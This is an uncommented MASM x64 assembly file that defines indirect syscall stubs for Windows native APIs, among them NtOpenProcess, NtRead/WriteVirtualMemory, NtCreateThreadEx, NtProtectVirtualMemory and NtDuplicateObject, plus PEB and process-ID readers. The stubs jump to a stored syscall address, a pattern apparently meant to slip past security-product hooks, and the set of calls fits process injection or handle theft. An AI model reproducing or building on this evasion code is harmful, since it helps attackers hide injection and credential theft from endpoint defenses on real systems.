EXTERN pebBase : qword

EXTERN g_ssn:DWORD
EXTERN g_syscallAddr:QWORD

EXTERN g_ssn_read:DWORD
EXTERN g_ssn_write:DWORD
EXTERN g_ssn_thread:DWORD
EXTERN g_ssn_QSI:DWORD
EXTERN g_ssn_QIP:DWORD
EXTERN g_ssn_allocate:DWORD
EXTERN g_ssn_free:DWORD
EXTERN g_ssn_protect:DWORD
extern g_ssn_duplicate:DWORD
.code

GetMyPeb PROC
	mov rax, gs:[60h]
	mov [pebBase], rax
	ret
GetMyPeb ENDP           

Syscall_NtOpenProcess PROC
	mov r10, rcx
	mov eax, g_ssn     
    jmp qword ptr [g_syscallAddr]
Syscall_NtOpenProcess ENDP

Syscall_NtReadVirtualMemory PROC
    mov r10, rcx            
    mov eax, g_ssn_read     
    jmp qword ptr [g_syscallAddr] 
Syscall_NtReadVirtualMemory ENDP

Syscall_NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, g_ssn_write
    jmp qword ptr [g_syscallAddr]
Syscall_NtWriteVirtualMemory ENDP

Syscall_NtCreateThreadEx PROC
    mov r10, rcx
    mov eax, g_ssn_thread
    jmp qword ptr [g_syscallAddr]
Syscall_NtCreateThreadEx ENDP

Syscall_NtQuerySystemInformation PROC
    mov r10, rcx
    mov eax, g_ssn_QSI
    jmp qword ptr [g_syscallAddr]
Syscall_NtQuerySystemInformation ENDP

Syscall_NtQueryInformationProcess PROC
    mov r10, rcx
    mov eax, g_ssn_QIP
    jmp qword ptr [g_syscallAddr]
Syscall_NtQueryInformationProcess ENDP

Syscall_NtAllocateVirtualMemory PROC
    mov r10, rcx                
    mov eax, g_ssn_allocate     
    jmp qword ptr [g_syscallAddr] 
Syscall_NtAllocateVirtualMemory ENDP

Syscall_NtFreeVirtualMemory PROC
    mov r10, rcx
    mov eax, g_ssn_free     
    jmp qword ptr [g_syscallAddr]
Syscall_NtFreeVirtualMemory ENDP

Syscall_NtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, g_ssn_protect  
    jmp qword ptr [g_syscallAddr]
Syscall_NtProtectVirtualMemory ENDP

GetMyProcessId PROC
    mov rax, gs:[40h]  
    ret
GetMyProcessId ENDP

Syscall_NtDuplicateObject PROC
    mov r10, rcx
    mov eax, g_ssn_duplicate
    jmp qword ptr [g_syscallAddr]
Syscall_NtDuplicateObject ENDP

END
